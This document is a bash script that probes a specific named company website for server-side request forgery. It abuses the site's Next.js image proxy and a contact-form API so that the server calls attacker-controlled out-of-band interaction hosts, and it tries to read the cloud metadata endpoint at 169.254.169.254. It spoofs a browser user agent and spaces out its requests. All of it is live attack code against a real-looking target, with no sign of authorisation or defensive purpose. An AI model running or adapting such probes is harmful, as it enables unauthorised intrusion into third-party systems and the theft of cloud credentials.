#!/bin/bash
U="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
H1=oob3c46cd340360.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
H2=oob895b3e85ae87.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in

echo "== SSRF probe: _next/image url -> OOB =="
for u in "http://$H1/ssrf-img" "https://$H1/ssrf-img-tls" "http://$H1/a.png" ; do
  code=$(curl -s -o /tmp/o1 -w "%{http_code}" -A "$UA" --get --data-urlencode "url=$u" --data "w=640&q=75" "$U/_next/image")
  echo "[$code] url=$u -> $(head -c 120 /tmp/o1)"
  sleep 7
done

echo "== SSRF probe: /api/send targets -> OOB =="
curl -s -o /tmp/o2 -w "[%{http_code}]\n" -A "$UA" -X POST "$U/api/send" \
  --data-urlencode "fname=A" --data-urlencode "lname=B" --data-urlencode "areacode=973" \
  --data-urlencode "tel=1234567" --data-urlencode "cname=t" --data-urlencode "subject=s" \
  --data-urlencode "msg=m" --data-urlencode "check=on" \
  --data-urlencode "targets=http://$H2/relay-url"
echo "BODY: $(head -c 300 /tmp/o2)"
sleep 7

echo "== /api/send none param SSRF (GET) =="
curl -s -o /tmp/o3 -w "[%{http_code}]\n" -A "$UA" "$U/api/send?none=http://$H1/none-get"
head -c 150 /tmp/o3
echo
sleep 5
echo "== metadata via _next/image =="
curl -s -o /tmp/o4 -w "[%{http_code}]\n" -A "$UA" --get --data-urlencode "url=http://169.254.169.254/latest/meta-data/" --data "w=64&q=75" "$U/_next/image"
head -c 200 /tmp/o4; echo
